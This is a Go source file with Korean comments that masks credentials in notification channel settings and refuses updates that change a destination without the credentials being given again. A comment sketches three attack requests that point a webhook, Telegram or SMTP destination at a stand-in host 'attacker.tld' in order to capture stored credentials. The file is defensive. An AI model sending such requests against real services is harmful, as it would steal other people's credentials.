package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix 는 가린 값의 표시 접두입니다. API가 자격 증명을 돌려줄 때 이 접두가 붙은
// 값으로 진짜 내용을 바꾸고, 갱신 API가 이 접두가 붙은 값을 받으면 「저장소의 원값 유지」로 이해합니다.
//
// 빈 문자열이나 고정 상수 대신 접두를 쓰는 이유: 식별에 도움이 되는 조각을 같이 실을 수
// 있습니다(MaskedValue). 사용자가 「어느 로봇인지」를 비밀을 다시 붙이지 않고 구분합니다.
const MaskedPrefix = "__masked__"

// MaskedValue 는 가린 값을 만듭니다.
//
//	"__masked__"              원값이 너무 짧아 힌트를 주지 않음
//	"__masked__:…ab12cd"      원값 끝 6자를 식별 힌트로 붙임
//
// 끝 6자만 보이는 것은 의도입니다. Webhook 주소의 식별 정보는 끝부분(기업 위챗 key,
// 페이슈 로봇 id)에 있고, 앞부분은 로봇마다 같아 식별 가치가 없습니다. 끝 6자로는
// 자격 증명을 복원할 수 없지만, 설정하는 사람이 「내 그 방」인지는 알 수 있습니다.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked 는 값이 가린 값인지(API가 돌려준 뒤 수정되지 않았는지) 보고합니다.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig 는 설정의 복사본을 반환하고, 그 채널의 자격 증명 필드를 가린 값으로 바꿉니다.
//
// 모르는 채널 종류는 원본 설정 대신 빈 map을 반환합니다. UI에 「설정을 쓸 수 없음」이
// 보이는 편이, 종류를 모를 때 자격 증명이 있을 수 있는 원문을 통째로 토하는 것보다 낫습니다.
// 자격 증명이 아닌 필드는 그대로 둬야 UI가 정상적으로 보여 줍니다.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers 같은 중첩 구조는 자격 증명 하나로 통째 처리합니다. 자식 키마다
		// 「어느 자식이 자격 증명인지」를 채널이 다시 선언하면 복잡도만 커집니다.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials 는 「대상 주소는 바뀌었는데 호출자가
// 자격 증명 필드를 밝히지 않음」입니다. 조용히 통과하거나 자격 증명을 버리지 않고
// 이것을 반환합니다. 이유는 PrepareConfigUpdate를 보세요.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 바뀐 목적지 키
	Missing []string // 명시하지 않은 자격 증명 키
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 바뀌었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, ", ") + ")도 다시 입력하세요. 새 값을 넣거나, 빈 값으로 더 이상 자격 증명이 필요 없음을 밝히세요. " +
		"원래 자격 증명은 옛 주소에만 유효합니다. 그대로 쓰면 새 주소에 넘기는 것입니다."
}

// PrepareConfigUpdate 는 채널 설정을 합치고, 「대상 주소 변경」이라는 민감한 경우를 처리합니다.
//
// 채널 갱신 경로에서 맨 MergeConfig 대신 씁니다. 실제로 통하는 경로는 이렇습니다.
// 대상 주소(메시지를 어디로 보내는지)와 자격 증명(어떤 신원으로 보내는지)은 별도 필드이고,
// MergeConfig는 「언급하지 않은 키」를 저장소 원값으로 유지합니다. 그래서 채널을 PATCH할
// 수 있는 사람은 **주소만 바꾸고 자격 증명은 말하지 않으면** 서버가 저장소의 진짜
// 자격 증명을 자기가 통제하는 끝점으로 보내게 할 수 있습니다.
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 원래 Authorization 헤더가 요청과 함께 나감
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<진짜Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 뒤에 사용자 이름과 비밀번호를 넘김
//
// 이 경로는 완전히 조용하고 리다이렉트에 기대지 않습니다(다른 호스트 점프 거절로는 못 막음).
// 이 패키지 가리기의 목표인 「자격 증명을 브라우저에 다시 보여 주지 않음」을 바로 뚫습니다.
//
// 규칙: 목적지 키 중 하나가 새 값으로 바뀌면, 호출자는 **모든** 자격 증명 키를 명시해야 합니다.
//   - 새 값을 줌 → 새 값을 씀
//   - 빈 문자열을 명시 → 그 필드는 더 이상 자격 증명이 필요 없음(비우기 의미 유지)
//   - 가린 값을 그대로 돌려주거나 키를 아예 말하지 않음 → 거절
//
// 세 번째도 거절하는 이유: 「가린 값」의 의미는 「옛 자격 증명 유지」이고, 옛 자격 증명은
// 옛 주소에만 유효합니다. 「자격 증명을 자동으로 버리기」는 하지 않습니다. 선택 필드
// (webhook의 headers, email의 password)가 조용히 「인증은 없는데 API는 200」이 되면
// 오류보다 원인 찾기가 더 어렵습니다. 운영자가 한 번 더 입력하는 편이 낫습니다.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("채널 종류 %q이(가) 등록되지 않았습니다", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 문자열이 아닌 자격 증명 값(webhook의 headers는 객체) 안에 가리기 리터럴이 있으면,
	// 호출자가 「원값 유지」 센티널을 구조 안에 넣은 것입니다. MergeConfig는 「문자열이고
	// 접두가 있음」만 가린 값으로 봅니다. 이 형태는 일반 객체로 그대로 저장됩니다.
	// 저장소에 리터럴 "__masked__"가 남고, 이후 인증이 조용히 실패하며 오류도 없습니다. 거절합니다.
	//
	// 이 검사는 **맨 앞**에 있어야 합니다. 주소가 안 바뀌면 일찍 반환하므로, 뒤에 두면
	// 「주소 변경」 경로만 덮습니다(첫 버전이 그렇게 잘못 두었고, 테스트가 바로 잡았습니다).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 실제로 바뀐 목적지 키를 찾습니다. 가린 값은 「안 바뀜」입니다.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 주소가 안 바뀌면 보통 병합입니다(가린 값은 원값 유지, 빈 문자열은 삭제, 나머지는 덮어씀).
		return MergeConfig(stored, incoming), nil
	}

	// 주소가 바뀌면 각 자격 증명 키를 명시해야 합니다.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers 는 가리기 센티널을 문자열이 아닌 구조 안에 넣어 제출하는 것을 거절합니다.
//
// 가리기의 전제는 「값 전체가 문자열」입니다. webhook의 headers 같은 객체 필드는
// 통째로 가리거나(문자열 "__masked__") 통째로 제출해야 합니다. 센티널을 객체 안에
// 넣으면 「유지」를 표현하지도 못하고 진짜 값으로 저장됩니다.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("필드 %s 의 내용에 가리기 표시 %q이(가) 있습니다. 이 필드는 통째로 비워 유지를 나타내거나 통째로 새 값을 제출해야 하며, 구조 안에 가리기 자리 표시를 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue 는 두 설정 값이 같은지 비교합니다. JSON 직렬화로 비교하는 이유는
// 타입 차이를 같이 처리하기 위해서입니다. 프론트가 제출한 포트는 number이고 저장소에서
// 읽은 값은 float64라, == 로 비교하면 오판합니다.
//
// 「빈 값」은 비교 전에 정규화해야 합니다. 빈 문자열과 「키가 없음」은 이 설정 모델에서
// 같은 상태입니다. MergeConfig가 빈 문자열을 명시적 비우기로 보고 키를 delete하기 때문입니다.
// 정규화하지 않으면 항상 비워 두는 선택 목적지 필드(Telegram의 base_url이 유일한 예:
// 비우면 공식 주소)가 이 경로를 탑니다.
//
//	새로 만들 때 base_url:"" 를 저장 → 첫 저장에서 MergeConfig가 키를 삭제
//	→ 두 번째 저장 때 incoming은 ""이고 stored에는 키가 없어 「주소가 바뀜」으로 판단
//	→ 자격 증명은 가린 값 → 400 「대상 주소가 바뀌었습니다. 자격 증명 필드도 다시 입력하세요」
//
// 그 뒤의 저장은 전부 실패합니다. 사용자는 Bot Token을 다시 붙여야 하는데, 아무것도 바꾸지 않았습니다.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue 는 설정 값이 「빈 값」인지 판단합니다.
// 기준은 MergeConfig의 비우기 판단과 같아야 합니다(strings.TrimSpace(s) == "").
// 그렇지 않으면 「MergeConfig는 지워야 한다고 보고, sameConfigValue는 값이 있다고 보는」 틈이 생깁니다.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig 는 incoming을 stored 위에 합칩니다. 채널 설정 갱신용입니다.
//
// 규칙:
//   - incoming 값이 가린 값인 키 → stored 원값 유지(사용자가 그 필드를 안 바꿈)
//   - incoming 값이 빈 문자열인 키 → 명시적 비우기로 보고 키 삭제
//   - 나머지 키 → incoming 값으로 덮어씀
//   - stored에 있고 incoming에 없는 키 → 유지(부분 갱신)
//
// 빈 문자열을 「비우기」로 볼지는 분명해야 합니다. 프론트 폼은 안 채운 필드를 빈 문자열로
// 제출합니다. 그걸 유효한 값으로 쓰면 「비워서 원값 유지」 필드가 실제로 지워집니다.
// 여기서는 명시적 비우기를 선택합니다. 잘못 넣은 필드를 지울 때 다른 표현이 없기 때문입니다
// (필드를 빼면 「제공 안 함」과 「빈 값 제공」을 구분할 수 있지만, UI는 그 구분을 쓰지 않습니다).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // 가린 값 = 수정 없음, stored 유지
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
